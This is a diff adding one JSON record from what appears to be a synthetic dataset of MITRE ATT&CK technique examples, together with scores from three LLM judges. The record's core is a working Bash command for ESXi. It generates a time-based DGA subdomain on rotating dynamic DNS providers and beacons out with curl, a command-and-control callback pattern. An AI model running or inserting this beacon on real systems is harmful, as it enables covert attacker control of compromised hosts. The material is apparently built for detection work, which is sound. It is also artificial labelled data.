@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "s=$(date -u +%G%V%u); sub=$(echo -n \"$s\" | md5sum | cut -c1-14); providers=(hopto.org sytes.net zapto.org ddns.net); dom=\"$sub.${providers[$(($(date -u +%u)%${#providers[@]}))]}\"; port=$(( 49152 + ($(date -u +%M) * 13 % 16383) )); curl --connect-timeout 6 \"https://$dom:$port/check\"",
+  "explanation": "Uses ISO week/day to drive a DGA label and rotates among different dynamic DNS providers with a computed high-ephemeral port. This leverages dynamic DNS resolution per T1568.",
+  "rationale_steps": [
+    "Build a weekly seed and hash to generate the subdomain.",
+    "Rotate provider domain based on day of week.",
+    "Choose a high ephemeral port from a formula.",
+    "Connect via curl to the dynamic domain and port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-3af16eca",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Bash command is well-formed with balanced quotes/parentheses, correct array and arithmetic expansions, proper separators, and valid flags.",
+        "semantic_score": 5,
+        "semantic_justification": "It algorithmically generates a subdomain, rotates among dynamic DNS providers and ephemeral ports, then beacons via curl, demonstrating T1568 dynamic resolution (assuming curl/md5sum are available).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:37:01.072491Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper array syntax, valid arithmetic expansions, correct command separators, and valid curl flags throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 by using ISO week/day-based DGA label generation via md5sum, rotating among real dynamic DNS providers based on day-of-week, computing an ephemeral high port from the current minute, and beaconing via curl — all hallmarks of dynamic resolution C2.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:24:48.402660Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Bash syntax, correctly handles variable assignment, array indexing, and subshells with balanced delimiters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements a Domain Generation Algorithm (DGA) logic by using time-based seeds to derive a domain and port, perfectly aligning with T1568.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:24:56.531113Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
